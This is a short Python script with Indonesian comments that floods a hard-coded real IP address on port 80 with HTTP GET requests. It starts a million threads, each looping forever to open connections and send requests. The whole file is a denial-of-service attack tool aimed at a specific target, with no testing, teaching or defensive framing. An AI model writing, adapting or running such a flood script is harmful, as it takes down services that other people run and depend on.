import socket
import threading

# Konfigurasi target
target_ip = "138.201.139.144"
target_port = 80

# Fungsi untuk mengirim request
def send_request():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: 138.201.139.144\r\n\r\n", (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error: {e}")

# Buat 1000 thread untuk mengirim request
threads = []
for i in range(1000):
    for j in range(1000):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

# Tunggu semua thread selesai
for t in threads:
    t.join()
